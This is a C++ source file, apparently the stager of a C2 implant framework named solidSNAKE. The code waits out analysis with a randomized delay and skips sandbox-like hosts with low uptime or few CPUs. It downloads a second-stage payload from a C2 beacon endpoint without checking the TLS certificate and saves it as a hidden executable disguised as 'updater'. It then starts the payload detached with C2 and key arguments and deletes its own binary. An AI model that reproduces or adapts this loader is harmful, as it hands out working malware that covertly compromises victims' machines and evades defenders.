#include "snake/stager.hpp"

#include <cerrno>
#include <cctype>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <string>
#include <thread>
#include <vector>

#include "snake/net.hpp"
#include "snake/stealth.hpp"
#include "snake/sys.hpp"

namespace snake::stager {

namespace {

bool all_digits(const std::string& s) {
    if (s.empty()) return false;
    for (char c : s) {
        if (c < '0' || c > '9') return false;
    }
    return true;
}

}  // namespace

std::string usage() {
    return
        "usage: solidsnake-stager [flags]\n"
        "  --c2 <url>       C2 base URL (default " + SNAKE_OBF("https://127.0.0.1:4443") + ")\n"
        "  --payload <name> payload to fetch (default implant)\n"
        "  --key <hex>      pre-shared session key hex forwarded to the implant\n"
        "solidSNAKE test aid:\n"
        "  --delay-ms <n>   replace the anti-analysis delay (default: C3 formula)\n";
}

bool parse_args(const std::vector<std::string>& argv, Config& cfg, bool& help, std::string& err) {
    help = false;
    for (size_t i = 0; i < argv.size(); ++i) {
        const std::string& a = argv[i];
        auto next = [&](const char* flag) -> bool {
            if (i + 1 >= argv.size()) {
                err = std::string("missing value for ") + flag;
                return false;
            }
            ++i;
            return true;
        };
        if (a == "--c2") {
            if (!next("--c2")) return false;
            cfg.c2_url = argv[i];
        } else if (a == "--payload") {
            if (!next("--payload")) return false;
            cfg.payload = argv[i];
        } else if (a == "--key") {
            if (!next("--key")) return false;
            cfg.key = argv[i];
        } else if (a == "--delay-ms") {
            if (!next("--delay-ms")) return false;
            cfg.delay_override_ms = std::strtoll(argv[i].c_str(), nullptr, 10);
        } else if (a == "-h" || a == "--help") {
            help = true;
        } else {
            err = "unknown flag: " + a;
            return false;
        }
    }
    return true;
}

long long anti_analysis_delay_ms(uint64_t unix_nano) {
    return 5000 + (long long)(unix_nano % 10000);
}

void anti_analysis_delay(const Config& cfg) {
    long long ms = cfg.delay_override_ms >= 0
                       ? cfg.delay_override_ms
                       : anti_analysis_delay_ms((uint64_t)std::chrono::duration_cast<
                                                    std::chrono::nanoseconds>(
                                                    std::chrono::system_clock::now()
                                                        .time_since_epoch())
                                                    .count());
    if (ms > 0) sys::sleep_ms(ms);
}

bool env_check(const std::string& uptime_path) {
#ifdef _WIN32
    (void)uptime_path;
#else
    std::ifstream in(uptime_path);
    if (in) {
        double uptime = 0.0;
        if (in >> uptime) {
            if (uptime < 300) return false;
        }
    }
#endif
    return num_cpu() >= 2;
}

int num_cpu() {
    unsigned n = std::thread::hardware_concurrency();
    return n == 0 ? 1 : (int)n;
}

std::string download_url(const std::string& c2_url, const std::string& payload) {
    return c2_url + SNAKE_OBF("/api/v1/beacon?stage2=1&payload=") + payload;
}

bool parse_url(const std::string& url, Url& out) {
    size_t sep = url.find("://");
    if (sep == std::string::npos) return false;
    out.scheme = url.substr(0, sep);
    std::string rest = url.substr(sep + 3);
    size_t slash = rest.find('/');
    std::string authority = (slash == std::string::npos) ? rest : rest.substr(0, slash);
    out.path = (slash == std::string::npos) ? "" : rest.substr(slash);
    if (authority.empty()) return false;

    std::string port_str;
    if (authority[0] == '[') {
        size_t close = authority.find(']');
        if (close == std::string::npos) return false;
        out.host = authority.substr(1, close - 1);
        std::string tail = authority.substr(close + 1);
        if (!tail.empty()) {
            if (tail[0] != ':') return false;
            port_str = tail.substr(1);
        }
    } else {
        size_t colon = authority.rfind(':');
        if (colon != std::string::npos && all_digits(authority.substr(colon + 1))) {
            out.host = authority.substr(0, colon);
            port_str = authority.substr(colon + 1);
        } else {
            out.host = authority;
        }
    }
    if (out.host.empty()) return false;

    std::string sch;
    for (char c : out.scheme) sch.push_back((char)std::tolower((unsigned char)c));
    if (!port_str.empty()) {
        long p = std::strtol(port_str.c_str(), nullptr, 10);
        if (p <= 0 || p > 65535) return false;
        out.port = (uint16_t)p;
    } else {
        out.port = (sch == "http") ? 80 : 443;
    }
    return true;
}

std::vector<std::string> implant_args(const Config& cfg) {
    std::vector<std::string> args;
    args.push_back("--debug=false");
    if (!cfg.key.empty()) {
        args.push_back("--key");
        args.push_back(cfg.key);
    }
    args.push_back("--c2");
    args.push_back(cfg.c2_url + SNAKE_OBF("/ws"));
    return args;
}

std::string bin_name() {
#ifdef _WIN32
    return "updater.exe";
#else
    return "updater";
#endif
}

namespace {

void self_destruct() {
    std::string exe = sys::exe_path();
    if (exe.empty()) return;
#ifdef _WIN32
    std::string cmd = "ping 127.0.0.1 -n 3 > nul & del " + exe;
    sys::spawn_detached("cmd.exe", {"/C", cmd});
#else
    std::thread([exe] {
        sys::sleep_ms(3000);
        sys::remove_file(exe);
    }).detach();
#endif
}

}  // namespace

int stager_main(int argc, char** argv) {
    Config cfg;
    bool help = false;
    std::string err;
    if (!parse_args(std::vector<std::string>(argv + 1, argv + argc), cfg, help, err)) {
        std::fprintf(stderr, "%s\n\n%s", err.c_str(), usage().c_str());
        return 2;
    }
    if (help) {
        std::fputs(usage().c_str(), stdout);
        return 0;
    }

    anti_analysis_delay(cfg);

    if (!env_check()) return 0;

    Url u;
    if (!parse_url(cfg.c2_url, u)) return 1;
    std::string path = u.path + SNAKE_OBF("/api/v1/beacon?stage2=1&payload=") + cfg.payload;

    std::string data;
    if (u.scheme == "http") {
        auto r = net::http_get_plain(u.host, u.port, path, {}, 30);
        if (!r) return 1;
        data = r->body;
    } else {
        net::TlsOptions opts;
        opts.skip_verify = true;
        opts.timeout_seconds = 30;
        net::TlsClient c;
        if (!c.connect(u.host, u.port, opts)) return 1;
        auto r = net::http_request(c, "GET", u.host, u.port, path, {}, "");
        if (!r) return 1;
        data = r->body;
    }
    if (data.empty()) return 1;

    std::string tmp_dir = sys::make_temp_dir(".update-");
    if (tmp_dir.empty()) return 1;
#ifdef _WIN32
    const char kSep = '\\';
#else
    const char kSep = '/';
#endif
    std::string implant_path = tmp_dir + kSep + bin_name();

    if (!sys::write_file_exec(implant_path, data)) {
        sys::remove_tree(tmp_dir);
        return 1;
    }

    sys::Spawned child = sys::spawn_detached(implant_path, implant_args(cfg));
    sys::remove_tree(tmp_dir);
    if (!child.started) return 1;

    self_destruct();

    std::printf("{\"pid\":%lld,\"status\":\"deployed\",\"version\":\"%s\"}\n", child.pid,
                kVersion);
    return 0;
}

}  // namespace snake::stager
